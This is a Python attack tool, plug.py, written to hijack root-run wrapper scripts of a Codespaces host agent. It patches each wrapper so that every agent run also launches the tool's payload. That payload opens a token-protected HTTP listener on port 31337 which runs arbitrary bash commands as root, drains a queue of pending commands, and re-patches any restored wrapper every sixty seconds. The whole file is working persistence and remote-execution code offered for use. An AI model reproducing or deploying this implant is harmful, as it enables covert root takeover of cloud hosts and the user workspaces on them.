#!/usr/bin/env python3
# ─────────────────────────────────────────────────────────────────────────────
# plug.py — agent-wrapper plugin (mothership, Python edition)
#
# The agent (vmagent, host root) executes a fixed set of wrapper scripts from
# the writable mount (/.codespaces/bin) plus PrefetchScripts. This plugin
# FORKS those wrappers so that every time the agent runs one of them, our
# payload runs too — in the agent's own context. That is the hijack channel:
# the agent's next command is our command.
#
# Modes:
#   install [target...]   fork wrapper(s) with the plug header (default: all known)
#   revert  <target>      restore the backed-up original
#   status                patch state + listener health + inbox/result counts
#   run                   payload entry — called by a forked wrapper:
#                           * records execution context (plug-runs.log, CTX_MARKER)
#                           * ensures an HTTP listener is up (host root when a
#                             host wrapper fired → POST /cmd = root exec)
#                           * drains the COMMAND INBOX (we queue commands anytime;
#                             the agent's next fire executes them — "no boundaries")
#                           * self-heals any wrapper re-extracted by env-config
#   cmd <command...>      queue a command for the agent's next fire (inbox)
#   serve                 HTTP listener (0.0.0.0:31337), beacon-compatible API
#   selfheal              re-fork clean wrappers (called by the node beacon loop)
#
# API (token: mothership-beacon-2024):
#   GET  /health              -> { ok, host, pid, cwd, port, impl }
#   POST /cmd    {"cmd":...}      exec via /bin/bash -c -> { exitCode, stdout, stderr }
#   POST /cmd    {"cmd":..., "bg":true}  detached background process
#   POST /inbox  {"cmd":...}      queue a command for the next wrapper fire
#
# Stdlib only — no pip deps. python3 on host (Ubuntu 22.04) and container (Debian 12).
# ─────────────────────────────────────────────────────────────────────────────

import json
import os
import re
import socket
import subprocess
import sys
import time
import uuid

KIT_DIR = os.path.dirname(os.path.realpath(__file__))
PLUG_SELF = os.path.join(KIT_DIR, "plug.py")

SHARED = "/workspaces/.codespaces/shared"
BACKUP_DIR = os.path.join(SHARED, "wrappers", "orig")
INBOX_DIR = os.path.join(SHARED, "plug-inbox")
RESULTS_DIR = os.path.join(SHARED, "plug-results")
RUNS_LOG = os.path.join(SHARED, "plug-runs.log")
MARKER = os.path.join(SHARED, "CTX_MARKER")
SERVE_OUT = os.path.join(SHARED, "plug-serve.out")

PORT = int(os.environ.get("BEACON_PORT", "31337"))
TOKEN = os.environ.get("BEACON_TOKEN", "mothership-beacon-2024")

HEADER_MARK = "PLUG-PY"

# The agent's existing wrapper chain (writable mount + PrefetchScripts).
KNOWN_WRAPPERS = [
    "/.codespaces/bin/gitcredential_github.sh",
    "/.codespaces/bin/start_jupyter_server.sh",
    "/.codespaces/bin/Ssh/installSSH.sh",
    "/.codespaces/bin/sourcer.sh",
    "/.codespaces/bin/smbclientlogs.sh",
    "/.codespaces/bin/Utilities/installCWTools.sh",
    "/.codespaces/bin/mount_data_disk.sh",
    "/.codespaces/bin/backup_data_disk_images.sh",
    "/.codespaces/bin/PrefetchScripts/capture_ranges",
    "/.codespaces/bin/PrefetchScripts/prefetch_with_sleep",
    "/.codespaces/bin/PrefetchScripts/cifs_io_entry.py",
]


def log(msg):
    try:
        os.makedirs(SHARED, exist_ok=True)
        with open(RUNS_LOG, "a") as f:
            f.write("%s %s\n" % (time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), msg))
    except Exception:
        pass


def append_marker(ctx_lines):
    """Prove where we ran (host vs container) — only called when we START a listener."""
    try:
        os.makedirs(SHARED, exist_ok=True)
        with open(MARKER, "a") as f:
            f.write("=== %s plug.py started listener ===\n" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
            for line in ctx_lines:
                f.write(line + "\n")
    except Exception:
        pass


def current_context(wrapper=None):
    ctx = ["hostname: %s" % socket.gethostname()]
    try:
        ctx.append("uid: %s" % os.getuid())
        ctx.append("user: %s" % (os.getenv("USER") or os.getenv("USERNAME") or "?"))
    except Exception:
        pass
    if wrapper:
        ctx.append("wrapper: %s" % wrapper)
    ctx.append("argv: %s" % " ".join(sys.argv))
    return ctx


# ── wrapper forking ─────────────────────────────────────────────────────────

def strip_existing_headers(content):
    """Drop any prior plug header block (ours or the old ext-beacon one), keep the shebang."""
    lines = content.split("\n")
    out = []
    skipping = False
    for i, line in enumerate(lines):
        if skipping:
            # header block ends after the plug/ext-beacon invocation line
            if ("plug.py run" in line) or ("ext-beacon.sh" in line) or (line.strip() == "fi"):
                skipping = False
            continue
        if i == 0 and line.startswith("#!"):
            out.append(line)
            continue
        if ("PLUG-PY" in line) or ("WRAP-EXT-BEACON" in line) or ("ext-beacon.sh" in line) or ("plug.py run" in line):
            skipping = True
            continue
        if line.strip() in ("if command -v python3 >/dev/null 2>&1; then PLUG_PY=python3; else PLUG_PY=python; fi",):
            skipping = True
            continue
        out.append(line)
    return "\n".join(out).rstrip("\n") + "\n"


def header_for(target, backup_dir):
    name = os.path.basename(target)
    return (
        "# %s — fork of %s (see %s)\n"
        "if command -v python3 >/dev/null 2>&1; then PLUG_PY=python3; else PLUG_PY=python; fi\n"
        '"$PLUG_PY" %s run --wrapper "$0" >/dev/null 2>&1\n'
    ) % (HEADER_MARK, name, backup_dir, PLUG_SELF)


def is_forked(target):
    try:
        with open(target, "r", errors="replace") as f:
            return HEADER_MARK in f.read()
    except Exception:
        return False


def install(targets=None):
    os.makedirs(BACKUP_DIR, exist_ok=True)
    targets = targets or KNOWN_WRAPPERS
    for target in targets:
        if not os.path.isfile(target):
            print("missing  %s" % target)
            continue
        with open(target, "r", errors="replace") as f:
            current = f.read()
        body = strip_existing_headers(current)
        shebang = body.split("\n", 1)[0] if body.startswith("#!") else "#!/bin/sh"
        rest = body.split("\n", 1)[1] if "\n" in body else ""
        name = os.path.basename(target)
        orig = os.path.join(BACKUP_DIR, name + ".orig")
        if not os.path.exists(orig):
            # first time: preserve the true original (pre-any-header) as the backup
            with open(orig, "w") as f:
                f.write(strip_existing_headers(current))
            print("[plug] original saved -> %s" % orig)
        new = shebang + "\n" + header_for(target, BACKUP_DIR) + rest
        with open(target, "w") as f:
            f.write(new)
        try:
            os.chmod(target, 0o755)
        except Exception:
            pass
        print("[plug] PATCHED  %s" % target)
    print("[plug] done. backups: %s" % BACKUP_DIR)


def revert(target):
    orig = os.path.join(BACKUP_DIR, os.path.basename(target) + ".orig")
    if not os.path.isfile(orig):
        print("[plug] no backup for %s" % target)
        return 1
    with open(orig, "r") as f:
        content = f.read()
    with open(target, "w") as f:
        f.write(content)
    try:
        os.chmod(target, 0o755)
    except Exception:
        pass
    print("[plug] REVERTED %s <- %s" % (target, orig))
    return 0


def status():
    print("== wrapper patch state ==")
    for w in KNOWN_WRAPPERS:
        if os.path.isfile(w):
            print("%-8s %s" % ("PATCHED" if is_forked(w) else "clean", w))
        else:
            print("missing  %s" % w)
    print("== listener ==")
    if port_open(PORT):
        print("UP on :%d" % PORT)
    else:
        print("DOWN (will start on next wrapper fire)")
    inbox = len(glob_cmd(INBOX_DIR)) if os.path.isdir(INBOX_DIR) else 0
    res = len(os.listdir(RESULTS_DIR)) if os.path.isdir(RESULTS_DIR) else 0
    print("== inbox: %d queued | results: %d done ==" % (inbox, res))
    print("== backups: %s ==" % BACKUP_DIR)
    for f in sorted(os.listdir(BACKUP_DIR)) if os.path.isdir(BACKUP_DIR) else []:
        print("   %s" % f)


# ── listener (serve) ────────────────────────────────────────────────────────

def port_open(port, host="127.0.0.1", timeout=1.0):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def _auth(handler):
    h = handler.headers.get("x-beacon-token", "")
    q = handler.path.split("?", 1)[1] if "?" in handler.path else ""
    return h == TOKEN or ("token=" + TOKEN) in q


def _json(handler, code, obj):
    body = json.dumps(obj).encode()
    handler.send_response(code)
    handler.send_header("Content-Type", "application/json")
    handler.send_header("Content-Length", str(len(body)))
    handler.end_headers()
    handler.wfile.write(body)


def serve():
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            if not _auth(self):
                return _json(self, 401, {"error": "unauthorized"})
            if self.path.split("?")[0] == "/health":
                return _json(self, 200, {
                    "ok": True, "host": socket.gethostname(), "pid": os.getpid(),
                    "cwd": os.getcwd(), "port": PORT, "impl": "plug.py",
                })
            return _json(self, 404, {"error": "not found"})

        def do_POST(self):
            if not _auth(self):
                return _json(self, 401, {"error": "unauthorized"})
            path = self.path.split("?")[0]
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length) if length else b""
            try:
                body = json.loads(raw or b"{}")
            except Exception:
                return _json(self, 400, {"error": "bad json"})
            cmd = body.get("cmd")
            if not isinstance(cmd, str) or not cmd.strip():
                return _json(self, 400, {"error": "missing cmd"})
            if path == "/inbox":
                fn = queue_cmd(cmd)
                return _json(self, 200, {"queued": True, "file": fn})
            if path == "/cmd":
                if body.get("bg"):
                    child = subprocess.Popen(
                        ["/bin/bash", "-c", cmd],
                        start_new_session=True,
                        stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    )
                    return _json(self, 200, {"bg": True, "pid": child.pid})
                try:
                    p = subprocess.run(
                        ["/bin/bash", "-c", cmd], capture_output=True, timeout=60,
                        env=dict(os.environ),
                    )
                    return _json(self, 200, {
                        "exitCode": p.returncode,
                        "stdout": p.stdout.decode("utf-8", "replace"),
                        "stderr": p.stderr.decode("utf-8", "replace"),
                    })
                except subprocess.TimeoutExpired:
                    return _json(self, 200, {"exitCode": -1, "stdout": "", "stderr": "timeout"})
            return _json(self, 404, {"error": "not found"})

    srv = ThreadingHTTPServer(("0.0.0.0", PORT), H)
    with open(SERVE_OUT, "a") as f:
        f.write("%s plug.py serve listening on 0.0.0.0:%d pid=%d\n"
                % (time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), PORT, os.getpid()))

    # self-heal loop: re-fork any wrapper env-config re-extracted (same as the node beacon)
    import threading

    def heal_loop():
        while True:
            try:
                selfheal(quiet=True)
            except Exception:
                pass
            time.sleep(60)

    threading.Thread(target=heal_loop, daemon=True).start()
    srv.serve_forever()


def ensure_listener():
    """Start the listener if nothing is on :PORT. Returns True if we started it."""
    if port_open(PORT):
        return False
    try:
        with open(os.devnull, "w") as dn:
            subprocess.Popen(
                [sys.executable, PLUG_SELF, "serve"],
                start_new_session=True,
                stdin=subprocess.DEVNULL, stdout=dn, stderr=dn,
                env=dict(os.environ),
            )
        append_marker(current_context())
        log("started listener pid via %s" % sys.executable)
        return True
    except Exception as e:
        log("listener start failed: %s" % e)
        return False


# ── command inbox (agent runs our queued commands at its next fire) ─────────

def glob_cmd(d):
    return [os.path.join(d, f) for f in os.listdir(d) if f.endswith(".cmd")]


def queue_cmd(cmd):
    os.makedirs(INBOX_DIR, exist_ok=True)
    fn = os.path.join(INBOX_DIR, "%s-%s.cmd" % (time.strftime("%Y%m%d%H%M%S", time.gmtime()), uuid.uuid4().hex[:8]))
    with open(fn, "w") as f:
        f.write(cmd + "\n")
    log("queued: %s" % cmd[:120])
    return fn


def drain_inbox():
    if not os.path.isdir(INBOX_DIR):
        return 0
    os.makedirs(RESULTS_DIR, exist_ok=True)
    done = 0
    for fn in sorted(glob_cmd(INBOX_DIR)):
        base = os.path.basename(fn)[:-4]
        busy = fn[:-4] + ".busy"
        try:
            os.rename(fn, busy)
        except Exception:
            continue
        with open(busy, "r") as f:
            cmd = f.read().strip()
        try:
            p = subprocess.run(
                ["/bin/bash", "-c", cmd], capture_output=True, timeout=45,
                env=dict(os.environ),
            )
            out, err = p.stdout, p.stderr
        except subprocess.TimeoutExpired:
            out, err = b"", b"TIMEOUT"
            p = type("P", (), {"returncode": -1})()
        with open(os.path.join(RESULTS_DIR, base + ".out"), "wb") as f:
            f.write(out)
        with open(os.path.join(RESULTS_DIR, base + ".err"), "wb") as f:
            f.write(err)
        with open(os.path.join(RESULTS_DIR, base + ".exit"), "w") as f:
            f.write(str(p.returncode) + "\n")
        try:
            os.remove(busy)
        except Exception:
            pass
        log("executed queued cmd (exit %s): %s" % (p.returncode, cmd[:120]))
        done += 1
    return done


# ── payload entry (what a forked wrapper invokes) ───────────────────────────

def run(wrapper=None):
    log("fired via wrapper%s ctx: %s" % (" " + wrapper if wrapper else "", " | ".join(current_context(wrapper))))
    ensure_listener()
    drained = drain_inbox()
    healed = selfheal(quiet=True)
    if drained or healed:
        log("run complete: drained=%d healed=%d" % (drained, healed))


def selfheal(quiet=False):
    healed = 0
    for w in KNOWN_WRAPPERS:
        if os.path.isfile(w) and not is_forked(w):
            try:
                install([w])
                healed += 1
                if not quiet:
                    print("[plug] self-healed %s" % w)
            except Exception as e:
                if not quiet:
                    print("[plug] heal failed %s: %s" % (w, e))
    return healed


def main():
    args = sys.argv[1:]
    cmd = args[0] if args else "status"
    rest = args[1:]

    if cmd == "install":
        install([a for a in rest] or None)
    elif cmd == "revert":
        return revert(rest[0]) if rest else 1
    elif cmd == "status" or cmd == "--list":
        status()
    elif cmd == "run":
        wrapper = None
        if rest and rest[0] == "--wrapper" and len(rest) > 1:
            wrapper = rest[1]
        run(wrapper)
    elif cmd == "cmd":
        if not rest:
            print("usage: plug.py cmd <command...>")
            return 1
        fn = queue_cmd(" ".join(rest))
        print("queued -> %s (runs at next wrapper fire)" % fn)
    elif cmd == "serve":
        serve()
    elif cmd == "selfheal":
        selfheal()
    else:
        print(__doc__)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
